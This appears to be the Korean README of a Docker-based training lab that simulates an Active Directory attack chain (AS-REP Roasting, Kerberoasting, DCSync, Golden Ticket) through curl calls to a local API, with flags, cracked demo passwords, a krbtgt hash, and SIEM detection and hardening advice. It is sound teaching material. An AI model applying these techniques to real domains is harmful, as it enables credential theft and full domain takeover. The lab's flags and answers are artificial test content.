# 🏢 Lab 11: Active Directory & Kerberos 침투 실습 랩 (KeroShield)

> **사이버보안 실전 랩 시리즈 — 엔터프라이즈 Active Directory & Kerberos 도메인 장악 4단계 실습 환경**

---

## 📌 랩 개요

KeroShield는 엔터프라이즈 윈도우 도메인 환경(`CORP.LOCAL`)에서 가장 빈번하게 발생하는 **Kerberos 및 Active Directory 핵심 취약점**을 실습하고, 침투 경로(Kill Chain)를 직접 체험하며 SIEM 로그 분석 및 방어 완화 대책을 학습하는 대화형 보안 랩입니다.

- **표적 도메인**: `CORP.LOCAL` (NetBIOS: `CORP`)
- **도메인 컨트롤러**: `DC01.CORP.LOCAL` (`10.10.10.2`)
- **포레스트 기능 수준**: Windows Server 2022
- **도메인 SID**: `S-1-5-21-382947192-284918239-192837482`
- **웹 대화형 콘솔 & REST API 포트**: `http://localhost:8011`

---

## 🏗️ 아키텍처 & 공격 킬체인

```mermaid
flowchart TD
    A["0. 익명 / 일반 사용자 정찰 (LDAP Enum)"] --> B["1. AS-REP Roasting (j.smith)"]
    B -->|Pre-Auth 없음, 비밀번호 크래킹| C["2. Kerberoasting (mssql_svc)"]
    C -->|SPN TGS 티켓 추출 & 크래킹| D["3. DCSync 복제 공격 (backup_svc)"]
    D -->|Get-Changes-All 권한으로 krbtgt NTLM 탈취| E["4. Golden Ticket 생성 (ticketer.py)"]
    E -->|마스터 TGT 위조 (RID 512)| F["👑 도메인 컨트롤러 DC01 장악 (SYSTEM)"]
```

---

## 🎯 4단계 실습 시나리오 & 플래그

| 단계 | 공격 기법 | 취약점 / 설정 미흡 | 사용 도구 | 획득 플래그 |
|:---:|:---|:---|:---|:---|
| **Step 1** | **AS-REP Roasting** | `DONT_REQ_PREAUTH` (0x400000) 설정 계정 존재 (`j.smith`) | `GetNPUsers.py`, Hashcat (`-m 18200`) | `FLAG{ASREP_R04ST_PREAUTH_BYPASS_8201}` |
| **Step 2** | **Kerberoasting** | 일반 사용자 권한으로 서비스 계정 SPN 티켓 발급 가능 (`mssql_svc`) | `GetUserSPNs.py`, Hashcat (`-m 13100`) | `FLAG{KERBER04ST_SPN_TGS_EXTRACT_4918}` |
| **Step 3** | **DCSync Attack** | 비-DC 계정에 `DS-Replication-Get-Changes-All` 권한 부여 (`backup_svc`) | `secretsdump.py` (MS-DRSR) | `FLAG{DCSYNC_DRSR_KRBTGT_SYNC_7193}` |
| **Step 4** | **Golden Ticket** | 탈취된 `krbtgt` NTLM 해시로 도메인 관리자 TGT 위조 | `ticketer.py`, `psexec.py` | `FLAG{GOLDEN_TICKET_FOREST_OWNED_9934}` |

---

## 🚀 빠른 시작 (Quick Start)

### 1. Docker Compose 실행
```bash
cd labs/11_ad_kerberos_lab
docker compose up -d --build
```

브라우저에서 `http://localhost:8011` 접속하여 대화형 침투 콘솔을 이용할 수 있습니다.

### 2. vhack CLI 연동 실행
```bash
./vhack.py lab start 11
```

---

## 💻 단계별 실습 가이드

### Phase 0: 도메인 계정 및 취약 속성 정찰
```bash
# REST API를 통한 LDAP 객체 열거
curl -s http://localhost:8011/api/ad/objects | jq .
```
- `j.smith`: `dont_req_preauth: true` 확인
- `mssql_svc`: `spn: "MSSQLSvc/db01.corp.local:1433"` 확인
- `backup_svc`: `has_replication_rights: true` 확인

---

### Phase 1: AS-REP Roasting
Kerberos 사전 인증(Pre-Authentication)이 꺼져 있으면 비밀번호 없이도 KDC에 해당 계정의 타임스탬프 암호화 티켓(AS-REP)을 요청할 수 있습니다.
```bash
# Impacket GetNPUsers 시뮬레이션
curl -X POST http://localhost:8011/api/kerberos/as_req \
  -H "Content-Type: application/json" \
  -d '{"username": "j.smith"}'
```
- 추출된 해시: `$krb5asrep$23$j.smith@CORP.LOCAL:...`
- 크래킹: `Summer2025!`
- 플래그 1: `FLAG{ASREP_R04ST_PREAUTH_BYPASS_8201}`

---

### Phase 2: Kerberoasting
유효한 TGT를 보유한 도메인 사용자는 SPN이 등록된 모든 서비스 계정에 대해 KDC에 TGS 티켓을 요청할 수 있으며, 이 티켓은 서비스 계정의 비밀번호 해시(RC4/AES)로 암호화됩니다.
```bash
# TGS 요청
curl -X POST http://localhost:8011/api/kerberos/tgs_req \
  -H "Content-Type: application/json" \
  -d '{"tgt_token": "<PHASE_1_TGT>", "spn": "MSSQLSvc/db01.corp.local:1433"}'
```
- 추출된 해시: `$krb5tgs$23$*mssql_svc*CORP.LOCAL*MSSQLSvc/db01.corp.local:1433*...`
- 크래킹: `Password123!`
- 플래그 2: `FLAG{KERBER04ST_SPN_TGS_EXTRACT_4918}`

---

### Phase 3: DCSync (Directory Replication Abuse)
도메인 컨트롤러 간 동기화 권한(`DS-Replication-Get-Changes-All`)을 가진 `backup_svc` 계정을 악용하여 `MS-DRSR` RPC 호출로 NTDS.DIT 데이터베이스의 계정 해시를 실시간 덤프합니다.
```bash
curl -X POST http://localhost:8011/api/ad/dcsync \
  -H "Content-Type: application/json" \
  -d '{"username": "backup_svc", "password_or_hash": "BackupOperator2026!", "target_user": "all"}'
```
- 획득한 `krbtgt` NTLM 해시: `b2849e728491a9284f91823901bca928`
- 플래그 3: `FLAG{DCSYNC_DRSR_KRBTGT_SYNC_7193}`

---

### Phase 4: Golden Ticket & 포레스트 완전 장악
`krbtgt` 계정의 NTLM 해시는 도메인의 신뢰 닻(Root of Trust)입니다. 이를 알면 KDC 자체를 가장하여 만료되지 않는 임의 권한(Domain Admins RID 512)의 TGT를 직접 위조할 수 있습니다.
```bash
# 골든 티켓 위조
curl -X POST http://localhost:8011/api/kerberos/golden_ticket \
  -H "Content-Type: application/json" \
  -d '{
    "domain": "CORP.LOCAL",
    "domain_sid": "S-1-5-21-382947192-284918239-192837482",
    "krbtgt_hash": "b2849e728491a9284f91823901bca928",
    "user_to_impersonate": "Administrator"
  }'

# 위조된 티켓으로 DC01 원격 명령 실행
curl -X POST http://localhost:8011/api/ad/domain_admin_exec \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer <GOLDEN_TICKET_BLOB>" \
  -d '{"command": "whoami /all"}'
```
- 플래그 4: `FLAG{GOLDEN_TICKET_FOREST_OWNED_9934}`

---

## 🤖 자동 익스플로잇 스크립트 실행

```bash
python3 app/exploit_ad.py http://localhost:8011
```

전체 4단계 침투 시나리오를 자동으로 실행하고 모든 플래그 검증을 완료합니다.

---

## 🛡️ SIEM 탐지 & 엔터프라이즈 하드닝 (Hardening)

| 이벤트 ID | 이벤트 명칭 | 탐지 조건 및 지표 |
|:---:|:---|:---|
| **4768** | A Kerberos authentication ticket (TGT) was requested | Pre-Authentication Type이 `0` (None)인 티켓 발급 감시 (AS-REP Roasting) |
| **4769** | A Kerberos service ticket was requested | Ticket Encryption Type이 `0x17` (RC4-HMAC)인 대량 요청 감시 (Kerberoasting) |
| **4662** | An operation was performed on an object | Domain-DNS 객체에 대해 비-DC IP에서 Access Mask `0x100` (`Get-Changes-All`) 호출 (DCSync) |
| **4672** | Special privileges assigned to new logon | SeSecurityPrivilege / Domain Admin RID를 포함한 비정상 TGT 로그온 (Golden Ticket) |

### 핵심 완화 조치 (Mitigation):
1. **gMSA(Group Managed Service Accounts)** 도입으로 서비스 계정 암호를 128자리로 자동 순환.
2. Kerberos 암호화 스위트에서 **RC4-HMAC을 완전 비활성화**하고 **AES-256** 강제.
3. 도메인 루트 ACL에서 비인가 계정의 복제 권한(`Replication-Get-Changes`) 전수 회수.
4. **`krbtgt` 계정 비밀번호를 연 2회 주기적으로 2연속 변경**하여 구버전 키 즉시 무효화.
